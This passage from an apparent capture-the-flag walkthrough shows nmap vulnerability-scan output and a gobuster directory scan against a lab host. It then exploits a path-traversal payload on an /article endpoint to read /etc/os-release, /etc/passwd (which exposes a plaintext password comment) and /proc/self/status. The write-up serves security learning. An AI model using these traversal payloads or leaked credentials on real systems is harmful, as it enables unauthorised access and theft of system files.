|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&#039;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|_    Couldn&#039;t find a file-type field.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.6.9: 
|     	CVE-2021-3177	7.5	https://vulners.com/cve/CVE-2021-3177
|     	CVE-2020-27619	7.5	https://vulners.com/cve/CVE-2020-27619
|     	CVE-2020-8492	7.1	https://vulners.com/cve/CVE-2020-8492
|     	CVE-2020-26116	6.4	https://vulners.com/cve/CVE-2020-26116
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-16056/	*EXPLOIT*
|     	CVE-2019-9636	5.0	https://vulners.com/cve/CVE-2019-9636
|     	CVE-2019-16056	5.0	https://vulners.com/cve/CVE-2019-16056
|     	CVE-2018-20852	5.0	https://vulners.com/cve/CVE-2018-20852
|     	CVE-2018-20406	5.0	https://vulners.com/cve/CVE-2018-20406
|     	CVE-2018-1060	5.0	https://vulners.com/cve/CVE-2018-1060
|     	MSF:ILITIES/SUSE-CVE-2020-14422/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2020-14422/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/	4.3	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-8315/	*EXPLOIT*
|     	CVE-2021-28359	4.3	https://vulners.com/cve/CVE-2021-28359
|     	CVE-2020-8315	4.3	https://vulners.com/cve/CVE-2020-8315
|     	CVE-2020-14422	4.3	https://vulners.com/cve/CVE-2020-14422
|     	CVE-2019-9947	4.3	https://vulners.com/cve/CVE-2019-9947
|     	CVE-2019-9740	4.3	https://vulners.com/cve/CVE-2019-9740
|     	CVE-2019-18348	4.3	https://vulners.com/cve/CVE-2019-18348
|     	CVE-2019-16935	4.3	https://vulners.com/cve/CVE-2019-16935
|     	CVE-2021-23336	4.0	https://vulners.com/cve/CVE-2021-23336
|     	MSF:ILITIES/DEBIAN-CVE-2021-3426/	2.7	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-3426/	*EXPLOIT*
|_    	CVE-2021-3426	2.7	https://vulners.com/cve/CVE-2021-3426
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/1%OT=22%CT=1%CU=40063%PV=Y%DS=4%DC=T%G=Y%TM=61F9EB2E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D
OS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 48.616 days (since Wed Dec 15 04:37:20 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   38.25 ms  10.13.0.1
2   ... 3
4   170.72 ms 10.10.0.57

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 19:23:42 2022 -- 1 IP address (1 host up) scanned in 1505.56 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, we’ve got a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/linux&quot;&gt;Linux&lt;/a&gt; box running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; and some weird-ass httpd server on port 80.&lt;/p&gt;
&lt;p&gt;We’ll also hit 10.10.0.57 with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.0.57&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This only detects the /article endpoint I noted while poking around the site. (I could hit the site with a larger wordlist, but it doesn’t seem worth it.)&lt;/p&gt;
&lt;p&gt;I’m going to go out on a limb here and guess that we’re going to exploit the /article endpoint, which probably &lt;em&gt;is&lt;/em&gt; just pulling in files verbatim.&lt;/p&gt;
&lt;p&gt;A common file on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/linux&quot;&gt;Linux&lt;/a&gt; systems is /etc/os-release, so let’s see if we can include this. And, in fact, after a little experimentation it turns out that we can using &lt;code&gt;http://10.10.0.57/article?name=../../../etc/os-release&lt;/code&gt;:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;Ubuntu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;VERSION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;18.04.3 LTS (Bionic Beaver)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;ID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;ubuntu&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;ID_LIKE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;debian&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;PRETTY_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;Ubuntu 18.04.3 LTS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;VERSION_ID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;18.04&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;HOME_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://www.ubuntu.com/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;SUPPORT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://help.ubuntu.com/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;BUG_REPORT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://bugs.launchpad.net/ubuntu/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;PRIVACY_POLICY_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;VERSION_CODENAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;bionic&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt;UBUNTU_CODENAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;bionic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;(It looks like /article must be doing some simple escaping too.)&lt;/p&gt;
&lt;p&gt;Let’s grab /etc/passwd so we know which users are running on the system.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;passwd&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;passwd&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;#falconfeast:rootpassword&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;I wonder who the current process is running as? /proc/self/status should have the answer.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;proc&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;proc&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Name:	flask&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Umask:	0022&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;State:	S (sleeping)&lt;/span&gt;&lt;/span&gt;
